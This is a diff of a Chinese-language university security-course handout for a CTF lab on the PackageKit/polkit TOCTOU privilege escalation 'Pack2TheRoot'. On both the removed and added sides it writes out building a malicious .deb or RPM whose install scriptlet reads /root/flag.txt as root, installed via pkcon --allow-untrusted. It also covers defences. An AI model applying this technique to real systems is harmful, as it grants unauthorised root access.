@@ -5,7 +5,7 @@
 **主題**：PackageKit、polkit 與 TOCTOU Race Condition  
 **核心 CVE**：[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)（Pack2TheRoot，CVSS 8.8）
 
-[TOC]
+\[TOC\]
 
 ---
 
@@ -27,11 +27,11 @@
 | 時間 | 模組 | 類型 |
 |------|------|------|
 | 0:00–0:20 | Lecture：架構與威脅模型 | 講授 |
-| 0:20–0:50 | Lab 1：System Recon | Guided |
-| 0:50–1:40 | Lab 2：TOCTOU 攻擊 | Hands-on |
+| 0:20–0:50 | Interactive Lab 1：System Recon → Flag 1 🟢 | 互動引導 + 手動操作 |
+| 0:50–1:40 | Interactive Lab 2：TOCTOU 攻擊 → Flag 2 🟡 | 互動引導 + 手動操作 |
 | 1:40–1:50 | Break | 休息 |
-| 1:50–2:30 | Lab 3：防禦實作 | Hands-on |
-| 2:30–3:00 | 報告撰寫 | 個人作業 |
+| 1:50–2:30 | Interactive Lab 3：防禦實作 → Flag 3 🔴 | 互動引導 + 編程實作 |
+| 2:30–3:00 | Report Writing | 個人作業 |
 
 ---
 
@@ -67,6 +67,39 @@ ssh labuser@localhost -p 2222
 ```
 
 看到 shell prompt 代表環境就緒，輸入 `exit` 離開。
+
+---
+
+### 3.4 奪旗流程：互動式 Lab Shell（**強制要求**）
+
+本課程的 **三個 CTF Flag 必須透過互動式 Lab Shell 取得**。光是對 container 下指令無法獲得旗幟——互動驗證本身就是奪旗機制。
+
+```bash
+# 進入本週目錄
+cd /path/to/2026-ADV-CEH/weeks/week-12
+
+# 啟動互動式奪旗平台
+python3 w12-interactive-lab.py
+```
+
+不需要 `sshpass` — 腳本會自動使用 `pexpect` 處理 SSH 認證。
+
+**運作原理**：
+
+```
+你執行指令 → 輸入答案 → 系統驗證 → 正確 → 🏁 Flag 釋出
+                                → 錯誤 → 漸進提示 → 再試
+```
+
+**功能特色**：
+| 功能 | 說明 |
+|------|------|
+| 🏁 **旗幟即獎勵** | 每道關卡通過後，系統動態產出唯一 Flag |
+| 🔒 **階段鎖定** | 未完成 Phase 1 無法進入 Phase 2，確保循序漸進 |
+| ✅ **輸入驗證** | 比對你的答案與預期結果，即時回饋正確/錯誤 |
+| 💡 **漸進提示** | 答錯 3 次出現 hint，5 次自動顯示答案（不卡關） |
+| 💾 **進度持久化** | 隨時 Ctrl+C 中斷，下次執行自動從中斷處繼續 |
+| 🔧 **環境檢查** | 內建自動檢測 Docker、container、SSH 是否就緒 |
 
 ---
 
@@ -175,190 +208,130 @@ GLib event loop 的優先順序保證兩個訊息在 callback 執行前都被處
 
 ---
 
-## 五、Lab 1 — System Recon（0:20–0:50）
+## 五、Interactive Lab 1 — 系統偵察與奪旗 🟢（0:20–0:50）
 
 ### 學習重點
+- 透過互動式 Lab Shell 進行第一階段挑戰
+- 理解 polkit action 與授權規則結構
+- 找出 container 中的設定錯誤
 
-- system bus 與 session bus 的差異
-- PackageKit daemon 運作模式
-- polkit action 與授權規則結構
-
-### Step 1：進入環境，確認版本
-
-```bash
-ssh labuser@localhost -p 2222  # 密碼：labuser
-
-# 確認 PackageKit 版本（應落在 1.0.2–1.3.4 受影響範圍）
-pkcon --version
-
-# 確認服務狀態
-systemctl status packagekit --no-pager
-```
-
-**問題 1**：版本號是多少？是否在受影響範圍內？
-
-### Step 2：監控 DBus 訊息流
-
-開兩個 terminal：
+### 操作方式
 
 ```bash
-# Terminal 1（監控）
-dbus-monitor --system
+# 啟動互動式 Lab Shell
+python3 w12-interactive-lab.py
 
-# Terminal 2（觸發操作）
-pkcon get-updates
+# 選擇 Phase 1
+# → 回答問題，通過驗證後自動獲得 Flag 1
 ```
 
-觀察 Terminal 1 的輸出，找出 PackageKit 使用的 D-Bus interface 名稱。
+### 你將在互動過程中學到
 
-**問題 2**：PackageKit 的 D-Bus service name 是什麼？
+1. **Q1**：檢查 PackageKit 版本是否在受影響範圍
+2. **Q2**：閱讀自訂 polkit 規則檔，找出回傳 `YES` 的 action
+3. **Q3**：解釋為何 `allow_active = yes` 是危險設定
 
-### Step 3：查詢 polkit 授權規則
+### 驗收標準
 
-```bash
-# 列出所有 PackageKit 相關 action
-pkaction | grep packagekit
-
-# 查看安裝套件的授權規則（詳細模式）
-pkaction --verbose --action-id org.freedesktop.packagekit.package-install
-```
-
-**Flag 1 任務**：找出 container 中 `allow_active` 設定過於寬鬆的 polkit action，截圖並記錄 action ID 與 allow_active 值。正常安全設定應為 `auth_admin`；若顯示 `yes`，即為本次漏洞的授權前提。
-
-### Step 4：觀察 polkit 日誌
-
-```bash
-journalctl -u polkit -n 50 --no-pager
-```
-
-記錄觀察到的授權事件格式，供報告使用。
+- Flag 1 由互動式 Lab Shell 動態產出
+- 截圖終端機畫面（含 🏁 Flag 1 CAPTURED! 字樣）
 
 ---
 
-## 六、Lab 2 — TOCTOU 攻擊（0:50–1:40）
+## 六、Interactive Lab 2 — TOCTOU 攻擊與奪旗 🟡（0:50–1:40）
 
-### 6.1 概念模擬：用 Python 理解 TOCTOU（20 分鐘）
-
-在 Kali 本機（非 container）執行 Python 模擬：
+### 操作方式
 
 ```bash
-# 觀察脆弱版本的行為
-python3 toctou_demo.py --vulnerable
+# 啟動互動式 Lab Shell（進度會自動延續）
+python3 w12-interactive-lab.py
+
+# 選擇 Phase 2
+# → 互動系統會引導你完成攻擊並驗證結果
 ```
 
-閱讀 `toctou_demo.py` 的 `vulnerable_daemon()` 完整實作，理解 check 和 use 之間的窗口。
+### 你將在互動過程中學到
 
-**任務**：完成 `exploit_thread()` 的骨架（`# TODO` 標記處），可使用 Claude Code / Codex 輔助。攻擊成功後程式會印出模擬 flag。
+1. **Q1**：Fedora 使用 RPM 還是 DEB 格式？
+2. **Q2**：哪個 pkcon 參數允許安裝未簽章套件？
+3. **建立惡意 RPM**：互動系統自動在 container 中建立含 `%post` scriptlet 的套件
+4. **安裝觸發**：系統執行 `pkcon install-local --allow-untrusted`
+5. **驗證**：系統回讀 `/tmp/flag_captured.txt` 確認 root 執行
+6. **Q3**：為什麼 `%post` scriptlet 能以 root 執行？
 
-完成後，執行 safe 模式確認理解：
-
-```bash
-python3 toctou_demo.py --safe
-```
-
-### 6.2 真實攻擊：Pack2TheRoot Docker Lab（30 分鐘）
-
-回到 vulnerable container（port 2222）：
+### 真實攻擊流程（互動系統背後幫你完成）
 
 ```bash
-ssh labuser@localhost -p 2222  # 密碼：labuser
-```
+# 以下是由互動系統自動執行的指令（供理解用）：
+ssh labuser@localhost -p 2222
 
-**Step 1**：確認套件格式
-
-```bash
-dpkg --version 2>/dev/null && echo "[*] 使用 deb 格式" || echo "[*] 使用 rpm 格式"
-```
-
-**Step 2**：建立惡意 .deb 套件
-
-```bash
-mkdir -p /tmp/evil-pkg/DEBIAN
-
-cat > /tmp/evil-pkg/DEBIAN/control << 'EOF'
-Package: lab-evil-pkg
+# 建立 RPM 規格檔
+cat > /tmp/evil.spec << 'SPECEOF'
+Name: lab-evil-pkg
 Version: 1.0
-Architecture: amd64
-Maintainer: labuser
-Description: Week 12 Lab Package
-EOF
-
-cat > /tmp/evil-pkg/DEBIAN/postinst << 'EOF'
-#!/bin/bash
-# 這個 script 以 root 身份執行
+...
+%post
 cat /root/flag.txt > /tmp/flag_captured.txt
-chmod 644 /tmp/flag_captured.txt
 id >> /tmp/flag_captured.txt
-EOF
+SPECEOF
 
-chmod 755 /tmp/evil-pkg/DEBIAN/postinst
-dpkg-deb --build /tmp/evil-pkg /tmp/evil.deb
-```
+# 打包並安裝
+rpmbuild -bb /tmp/evil.spec
+pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-*.rpm
 
-**Step 3**：透過 PackageKit 安裝（觸發漏洞）
-
-```bash
-pkcon install-local --allow-untrusted /tmp/evil.deb
-```
-
-**Step 4**：讀取 flag
-
-```bash
+# 讀取旗幟
 cat /tmp/flag_captured.txt
 ```
 
-**Flag 2 任務**：取得 `/root/flag.txt` 的完整內容（格式：`PACK2THEROOT{...}`），截圖。
+### 驗收標準
 
-### 6.3 比較 patched 版本（5 分鐘）
-
-SSH 到 patched container（port 2223）：
-
-```bash
-ssh labuser@localhost -p 2223  # 密碼：labuser
-```
-
-重複 Step 3，觀察 polkit 的拒絕訊息，記錄差異供報告使用。
+- Flag 2 由互動式 Lab Shell 動態產出
+- 截圖終端機畫面（含 🏁 Flag 2 CAPTURED! 字樣）
+- 截圖 `/tmp/flag_captured.txt` 內容（含 `uid=0(root)` 輸出）
 
 ---
 
-## 七、Lab 3 — 防禦實作（1:50–2:30）
+## 七、Interactive Lab 3 — 防禦實作與奪旗 🔴（1:50–2:30）
 
-### 7.1 Python 安全版本實作（25 分鐘）
+### 操作方式
 
 ```bash
-# 先觀察不安全版本的 race condition
-python3 transaction_demo.py --vulnerable
-# 預期看到 balance 出現負數（double-spend）
+# 啟動互動式 Lab Shell（進度會自動延續）
+python3 w12-interactive-lab.py
 
-# 實作 safe_execute() 後測試
-python3 transaction_demo.py --safe
+# 選擇 Phase 3
+# → 互動系統會引導你完成 safe_execute() 實作並驗證
 ```
 
-完成 `transaction_demo.py` 的 `safe_execute()` 骨架（`# TODO` 標記處），可使用 Claude Code / Codex 輔助。通過壓力測試後程式印出 Flag 3。
+### 你將在互動過程中學到
 
-**實作提示**：
-- 方法 A：使用 `threading.Lock()`，讓 check 和 execute 成為原子操作
-- 方法 B：讀取一次狀態，不重複讀取（avoid re-check）
-- 方法 C：使用 compare-and-swap 語意
+1. **觀察**：執行脆弱版本，觀察 race condition 造成的負數餘額
+2. **實作**：編輯 `transaction_demo.py` 的 `safe_execute()` 方法
+3. **驗證**：互動系統自動執行 1000 輪壓力測試
+4. **Q4**：解釋你選擇的修復方法
 
-**Flag 3 任務**：讓 safe 版本通過 1000 次壓力測試（balance 不為負數），截圖輸出結果。
+### 安全實作提示
 
-### 7.2 討論：如何防禦 Pack2TheRoot？（15 分鐘）
+```python
+# 方法 A：使用 threading.Lock()
+def safe_execute(self, amount):
+    with self.lock:
+        if self.state != self.AUTHORIZED:
+            return False
+        time.sleep(0.001)  # 模擬 GLib event loop 延遲
+        if self.state != self.AUTHORIZED:
+            return False
+        self.balance -= amount
+        self.state = self.COMPLETE
+        self.execution_count += 1
+        return True
+```
 
-Pack2TheRoot 的正式修補（PackageKit 1.3.5）方向：
+### 驗收標準
 
-- `InstallFiles()` 加入嚴格的 state guard
-- Flags 在 authorization 時讀取並鎖定，不允許後續修改
-- 拒絕 backward state transition，改為報錯
-
-**更廣泛的防禦思考**：
-
-| 層次 | 工具 / 方法 |
-|------|------------|
-| 套件版本 | 確認 PackageKit ≥ 1.3.5 |
-| polkit hardening | 將 `allow_active` 從 `yes` 改為 `auth_admin` |
-| 系統強化 | AppArmor profile、seccomp filter |
-| 監控偵測 | `auditd`、Falco、`journalctl` IOC 監控 |
+- Flag 3 由互動式 Lab Shell 動態產出
+- 截圖終端機畫面（含 🏁 Flag 3 CAPTURED! 字樣）
+- 壓力測試結果須顯示「balance 出現負數：0 次」且「執行超過一次：0 次」
 
 ---
 
@@ -386,6 +359,11 @@ journalctl -u packagekit | grep "assertion failed"
 | 檔名 | `W12_滲透測試報告_學號_姓名.docx` |
 | 截止 | 上課當週週日 23:59 |
 
+**截圖要求**：
+- Flag 1：互動式 Lab Shell 顯示 🏁 Flag 1 CAPTURED! 的畫面
+- Flag 2：互動式 Lab Shell 顯示 🏁 Flag 2 CAPTURED! 的畫面 + container 中 `/tmp/flag_captured.txt` 內容（須含 `uid=0(root)`）
+- Flag 3：互動式 Lab Shell 顯示 🏁 Flag 3 CAPTURED! 的畫面 + 壓力測試結果（0 負數、0 重複）
+
 ---
 
 ## 十、延伸閱讀
@@ -394,5 +372,5 @@ journalctl -u packagekit | grep "assertion failed"
 - [CVE-2026-41651 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)
 - [CVE-2026-41651 — Ubuntu Security](https://ubuntu.com/security/CVE-2026-41651)
 - [dinosn/pack2theroot-lab — CTF Docker Lab](https://github.com/dinosn/pack2theroot-lab)
-- [PwnKit (CVE-2021-4034) — Qualys 原始技術分析](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)
+- [PwnKit (CVE-2021-4034) — Qualys 原始技術分析](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkt.txt)
 - [polkit 架構說明 — freedesktop.org](https://www.freedesktop.org/software/polkit/docs/latest/)
